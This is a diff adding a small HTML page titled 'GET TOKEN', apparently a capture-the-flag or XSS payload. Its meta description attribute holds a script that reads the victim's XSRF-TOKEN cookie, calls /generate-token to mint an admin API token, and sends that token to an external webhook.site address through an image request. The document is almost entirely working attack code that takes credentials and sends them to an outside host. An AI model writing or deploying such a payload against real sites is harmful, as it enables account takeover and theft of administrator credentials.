@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>GET TOKEN</title>
+    <!-- VERSION_GET_FLAG_V1 -->
+    <meta name="description" content='<script>
+        (function() {
+            var webhook_id = "366bfa59-cf51-45d1-86cd-fa26a87898bb";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+
+            function sendPing(data) {
+                var params = new URLSearchParams();
+                for (var key in data) { 
+                    let val_str = String(data[key]);
+                    params.append(key, val_str.substring(0,1000));
+                }
+                new Image().src = attacker_url + "?" + params.toString();
+            }
+
+            var xsrfTokenValue = null;
+            try {
+                var cookies = document.cookie.split(";");
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    if (cookie.startsWith("XSRF-TOKEN=")) {
+                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
+                        break;
+                    }
+                }
+            } catch (e_cookie) {
+                return; 
+            }
+
+            if (!xsrfTokenValue) {
+                return; 
+            }
+            
+            fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "X-XSRF-TOKEN": xsrfTokenValue
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(text_body => {
+                        throw new Error("GenTokenFailStatus: " + response.status);
+                    });
+                }
+                return response.json(); 
+            })
+            .then(data => {
+                if (data && data.token) {
+                    var adminApiToken = data.token;
+                    sendPing({ token: adminApiToken }); // Chỉ gửi token
+                }
+            })
+            .catch(error => {});
+        })();
+    </script>'>
+</head>
+<body>
+    <h1>GET TOKEN PAGE</h1>
+</body>
+</html>
